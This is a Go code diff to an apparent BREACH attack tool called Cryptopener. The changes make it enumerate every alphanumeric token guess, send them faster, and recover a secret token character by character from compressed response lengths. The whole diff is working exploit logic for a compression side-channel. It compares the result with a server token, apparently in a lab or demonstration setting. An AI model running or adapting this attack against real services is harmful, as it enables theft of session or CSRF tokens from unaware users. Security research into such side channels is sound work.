@@ -25,6 +25,19 @@ type Cryptopener struct {
 	correct_length int
 }
 
+func pow(x int, n int) int {
+	var ret int
+	if n == 0 {
+		ret = 1
+	} else {
+		ret = x
+		for i := 0; i < n - 1; i++ {
+			ret = x * ret
+		}
+	}
+	return ret
+}
+
 // NewCryptopener creates new instance of Cryptopener
 func NewCryptopener(address string, entry string) *Cryptopener {
 	cryptopener := Cryptopener{
@@ -54,6 +67,30 @@ func createPadding() string {
 	return ret
 }
 
+func createPayloads(n int) []string {
+	ret := make([]string, pow(62, n))
+	mutators := make([]TokenMutator, n)
+	next_tokens := make([]byte, n)
+	for i := 0; i < n; i++ {
+		mutators[i] = *NewMutator()
+		next_tokens[i] = mutators[i].NextToken()
+	}
+	for i := 0; i < pow(62, n); i++ {
+		next := ""
+		for j := n - 1; j >= 0; j-- {
+			if i % (pow(62, j)) == 0 {
+				next_tokens[j] = mutators[j].NextToken()
+			}
+		}
+		
+		for j := n - 1; j >= 0; j-- {
+			next = next + string(next_tokens[j])
+		}
+		ret[i] = next
+	}
+	return ret
+}
+
 // Run starts BREACH attack
 func (p *Cryptopener) Run() {
 	rand.Seed(time.Now().Unix())
@@ -64,11 +101,17 @@ func (p *Cryptopener) Run() {
 	p.correct_count = 0
 	x := 0
 	m := 1
+	n := 62
 	temp_length := 0
 	var prev_payload []byte
 	prev_payload = []byte("")
 	dummy_chars := "!#&%$*+-"
 	padding := ""
+	guesses := make([]string, 0)
+	//var guess_found bool
+
+	payloads := createPayloads(m)
+
 	for {
 		if x == 0 {
 			// create new payload
@@ -78,15 +121,13 @@ func (p *Cryptopener) Run() {
 				payload = []byte(string(payload) + string(dummy_chars[i]))
 			}
 			log.Printf("Sending payload: %s", string(payload))
-			time.Sleep(5 * time.Millisecond)
+			time.Sleep(500 * time.Microsecond)
 			// send payload into a socket and then response into channel
 			response := p.client.SendMessage(string(payload), padding)
 			p.base_length = p.analyseResponse(response)
 			x = 1
 		} else if x == 1 {
-			var payload []byte
-			var guesses []string
-			var guess_found bool
+			/*var payload []byte
 			for true {
 				// create new payload
 				payload = prev_payload
@@ -108,10 +149,10 @@ func (p *Cryptopener) Run() {
 					guesses = append(guesses, string(payload[len(payload) - m:]))
 					break
 				}
-			}
-			
+			}*/
+			payload := payloads[p.guess_count]
 			log.Printf("Sending payload: %s", string(payload))
-			time.Sleep(5 * time.Millisecond)
+			time.Sleep(500 * time.Microsecond)
 			// send payload into a socket and then response into channel
 			response := p.client.SendMessage(string(payload), padding)
 			temp_length = p.analyseResponse(response)
@@ -122,17 +163,21 @@ func (p *Cryptopener) Run() {
 				p.ResultToken = string(p.ResultToken) + string(payload[len(payload) - m:])
 				x = 0
 				p.correct_count++
-				prev_payload = payload
+				prev_payload = []byte(payload)
 				m = 1
 				p.guess_count = 0
+				guesses = guesses[:0]
+				n = 62
 				
-			} else if p.guess_count > (m * m * m * m * m) * 64 {
+			} else if p.guess_count >= n {
 				m++
+				payloads = createPayloads(m)
 				x = 0
 				p.guess_count = 0
-				if m == 4 {
+				n = n * 62
+				if m == 5 {
 					padding = padding + createPadding()
-				} else if m == 2 {
+				} else if m == 3 {
 					padding = padding + createPadding()
 				} else if m == 9 {
 					m = 0
@@ -140,7 +185,7 @@ func (p *Cryptopener) Run() {
 			}
 		}
 
-		if p.correct_count == 63 {
+		if p.correct_count == 64 {
 			log.Printf("The guessed token is %s", p.ResultToken)
 			log.Printf("Correct token is %s", server.Token)
 			break
